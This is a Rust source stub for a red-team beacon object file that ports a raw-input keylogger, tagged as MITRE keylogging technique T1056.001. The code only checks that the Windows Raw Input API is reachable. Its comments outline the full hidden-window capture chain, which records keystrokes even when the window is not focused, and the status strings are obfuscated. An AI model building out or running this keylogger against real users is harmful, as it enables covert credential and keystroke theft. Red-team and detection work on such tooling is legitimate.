// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
// Original C: REDMED-X/OperatorsKit — KeyloggerRawInput
//
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1056.001",
        name: "Input Capture: Keylogging",
        tactic: "Collection / Credential Access",
    },
];

// Phase 4 stub: confirm Raw Input API is reachable.
// Full chain (Phase 5+):
//   1. RegisterClassExW for "STATIC" message-only window class
//   2. CreateWindowExW(HWND_MESSAGE = -3, ...) → hidden window
//   3. RegisterRawInputDevices(RAWINPUTDEVICE {
//          usUsagePage: 0x01,          // HID_USAGE_PAGE_GENERIC
//          usUsage:     0x06,          // HID_USAGE_GENERIC_KEYBOARD
//          dwFlags:     0x00000100,    // RIDEV_INPUTSINK — capture even when not focused
//          hwndTarget:  hwnd,
//      })
//   4. PeekMessageW / GetMessageW loop, dispatch WM_INPUT (0x00FF)
//   5. GetRawInputData → RAWKEYBOARD struct → VKey + MakeCode + Flags
//   6. Buffer printable VK range (0x30–0x5A + specials); translate to ASCII
//   7. Unregister + DestroyWindow + UnregisterClass on cleanup / beacon teardown

dfr_fn!(
    get_message_w(
        msg:            *mut u8,
        hwnd:           isize,
        msg_filter_min: u32,
        msg_filter_max: u32
    ) -> i32,
    module = "user32.dll",
    api    = "GetMessageW"
);

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {}
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // Tier 1: verify Raw Input API is reachable via DFR.
    // Passing a null MSG pointer causes GetMessageW to return -1 immediately
    // (invalid parameter path) without entering the message loop.
    // We only care that the DFR resolve succeeded.
    let _ = unsafe { get_message_w(core::ptr::null_mut(), 0, 0, 0) };

    println!("[+] {}", obf!("Raw Input API ready"));
    println!("[*] {}", obf!("keylog chain documented in source comments"));
    println!("[*] {}", obf!("Phase 5+ full message-only window + RAWINPUT loop"));
    Ok(())
}
